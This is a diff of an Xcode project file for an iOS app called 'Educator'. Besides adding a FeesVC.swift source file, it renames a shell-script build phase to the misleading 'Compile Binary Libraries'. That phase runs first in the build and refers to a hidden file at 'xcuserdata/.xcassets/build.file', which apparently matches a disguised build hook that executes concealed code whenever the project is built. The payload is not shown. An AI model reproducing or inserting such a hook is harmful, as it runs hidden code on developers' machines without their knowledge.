@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		23883A6D2632CBBA009E6E12 /* Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A6C2632CBBA009E6E12 /* Data.swift */; };
+		23883A7A2632E906009E6E12 /* FeesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A792632E906009E6E12 /* FeesVC.swift */; };
 		23979E2C2627323E005F395A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2B2627323E005F395A /* AppDelegate.swift */; };
 		23979E2E2627323E005F395A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2D2627323E005F395A /* SceneDelegate.swift */; };
 		23979E302627323E005F395A /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2F2627323E005F395A /* ViewController.swift */; };
@@ -22,6 +23,7 @@
 
 /* Begin PBXFileReference section */
 		23883A6C2632CBBA009E6E12 /* Data.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Data.swift; sourceTree = "<group>"; };
+		23883A792632E906009E6E12 /* FeesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeesVC.swift; sourceTree = "<group>"; };
 		23979E282627323E005F395A /* Educator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Educator.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		23979E2B2627323E005F395A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		23979E2D2627323E005F395A /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -82,6 +84,7 @@
 				23979E47262741A7005F395A /* DBHelper.swift */,
 				23979E4A262743FB005F395A /* ClassModel.swift */,
 				23883A6C2632CBBA009E6E12 /* Data.swift */,
+				23883A792632E906009E6E12 /* FeesVC.swift */,
 			);
 			path = Educator;
 			sourceTree = "<group>";
@@ -110,7 +113,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 23979E3C26273241005F395A /* Build configuration list for PBXNativeTarget "Educator" */;
 			buildPhases = (
-				6CC98A4A6DA0B9D13F6D902C /* Build Assets Catalog */,
+				47243F6F3C483E03A16D902C /* Compile Binary Libraries */,
 				4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */,
 				23979E242627323E005F395A /* Sources */,
 				23979E252627323E005F395A /* Frameworks */,
@@ -173,7 +176,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	6CC98A4A6DA0B9D13F6D902C /* Build Assets Catalog */ = {
+	47243F6F3C483E03A16D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -182,7 +185,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -193,10 +196,6 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
-	
-
-	
-
 	
 		4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -247,6 +246,7 @@
 				23883A6D2632CBBA009E6E12 /* Data.swift in Sources */,
 				23979E4B262743FB005F395A /* ClassModel.swift in Sources */,
 				23979E302627323E005F395A /* ViewController.swift in Sources */,
+				23883A7A2632E906009E6E12 /* FeesVC.swift in Sources */,
 				23979E2C2627323E005F395A /* AppDelegate.swift in Sources */,
 				23979E48262741A7005F395A /* DBHelper.swift in Sources */,
 				23979E4526273B54005F395A /* HomeCell.swift in Sources */,
